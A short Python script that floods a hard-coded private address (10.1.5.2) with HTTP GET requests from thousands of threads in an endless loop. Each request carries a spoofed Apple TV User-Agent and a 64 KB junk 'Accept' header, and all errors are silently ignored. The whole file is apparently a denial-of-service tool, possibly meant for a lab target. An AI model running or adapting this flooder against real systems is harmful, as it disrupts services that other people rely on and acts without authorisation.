import requests
import random
import threading
import sys
import signal
import time

def handler(signum, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

if len(sys.argv) > 1:
    threads = int(sys.argv[1])
else:
    threads = 2**14

target_ip = "10.1.5.2"

data = "A" * 2**16

def thread_function():
    try:
        requests.get(f"http://{target_ip}/{random.randint(1, 10)}.html",
        headers={
            "User-Agent": "AppleCoreMedia/1.0.0.12B466 (Apple TV; U; CPU OS 8_1_3 like Mac OS X; en_us)",
            "Accept": data
        })
    except:
        pass

while True:
    for i in range(threads):
        x = threading.Thread(target=thread_function, args=())
        x.start()
        time.sleep(0.00001)
    time.sleep(0.01)